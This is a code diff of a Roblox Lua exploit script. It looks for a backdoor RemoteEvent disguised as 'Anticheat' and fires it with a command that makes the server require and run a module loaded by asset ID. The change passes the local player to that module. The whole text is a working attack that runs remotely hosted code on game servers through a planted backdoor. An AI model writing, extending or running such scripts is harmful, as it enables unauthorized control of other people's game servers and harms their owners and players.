@@ -24,7 +24,7 @@ local moduleID = 128783909791585
 local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")
 
 if backdoor then
-    local executeScript = string.format('require(%d)()', moduleID)
+    local executeScript = string.format('require(%d)(game.Players.LocalPlayer)', moduleID)
     backdoor:FireServer(executeScript)
     game:GetService("StarterGui"):SetCore(
 	"SendNotification",{
